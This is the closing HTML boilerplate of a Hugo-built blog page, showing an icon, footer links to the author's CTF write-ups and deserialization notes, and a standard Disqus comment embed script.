<div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path fill="none" d="M0 0h24v24H0z"/><path d="M12.344 17.963l-1.688 1.074-2.131-3.35c-.44 1.402-1.172 2.665-2.139 3.825-.402.483-.82.918-1.301 1.375-.155.147-.775.717-.878.82l-1.414-1.414c.139-.139.787-.735.915-.856.43-.408.795-.79 1.142-1.206 1.266-1.518 2.03-3.21 2.137-5.231H3v-2h4V7h-.868c-.689 1.266-1.558 2.222-2.618 2.857L2.486 8.143c1.395-.838 2.425-2.604 3.038-5.36l1.952.434c-.14.633-.303 1.227-.489 1.783H11.5v2H9v4h2.5v2H9.185l3.159 4.963zm3.838-.07L17.298 17H19V7h-4v10h.736l.446.893zM13 5h8v14h-3l-2.5 2-1-2H13V5z"/></g></svg>
</div>
</a>
</div>
<div class="text-sm text-gray-500 leading-tight a-gray">
<br>
Built with Hugo and theme <a href=https://github.com/heyeshuang/hugo-theme-tokiwa>Tokiwa</a>. 9028 words in this page.
</div>
</div>
</div>
</aside>
<footer class="w-full md:w-3/5 xl:w-1/2 order-3 max-w-3xl md:order-4 pt-2">
<hr class=double-line>
<div class="flex flex-wrap justify-between pb-2 leading-loose font-serif">
<a class=flex-grow-0 href=/2021/08/05/dasctf0721-wp/><svg class="fill-current inline-block h-4 w-4" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24"><path fill="none" d="M0 0h24v24H0z"/><path d="M7.828 11H20v2H7.828l5.364 5.364-1.414 1.414L4 12l7.778-7.778 1.414 1.414z"/></svg>
DasCTF0721 Wp
</a>
<a class=flex-grow-0 href=/2021/08/12/python-unserialize-notes-01-python/>
反序列化专题笔记·壹·python篇
<svg class="fill-current inline-block h-4 w-4" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24"><path fill="none" d="M0 0h24v24H0z"/><path d="M16.172 11l-5.364-5.364 1.414-1.414L20 12l-7.778 7.778-1.414-1.414L16.172 13H4v-2z"/></svg></a>
</div>
<div>
<div class="font-serif pb-2 flex align-start leading-loose">
<span class="heading pr-6 leading-loose">Related</span>
<span>
<a href=/2021/08/05/dasctf0721-wp/>DasCTF0721 Wp</a>&nbsp;&nbsp;/&nbsp;
<a href=/2021/07/29/cybricsctf2021-wp/>CybricsCTF2021 Wp</a>
</span>
</div>
</div>
<hr>
<div class=pb-2>
<div id=disqus_thread></div>
<script type=application/javascript>var disqus_config=function(){};(function(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById('disqus_thread').innerHTML='Disqus comments not available by default when the website is previewed locally.';return}var b=document,a=b.createElement('script');a.async=!0,a.src='//amiaaaz.disqus.com/embed.js',a.setAttribute('data-timestamp',+new Date),(b.head||b.body).appendChild(a)})()</script>
<noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript>
<a href=https://disqus.com class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a>
</div>
<hr>
</footer>
<script src=/dist/app.js></script>
<script src=/lib/fuse.min.js></script>
<script src=/lib/fastsearch.js></script>
</div>
</body>
</html>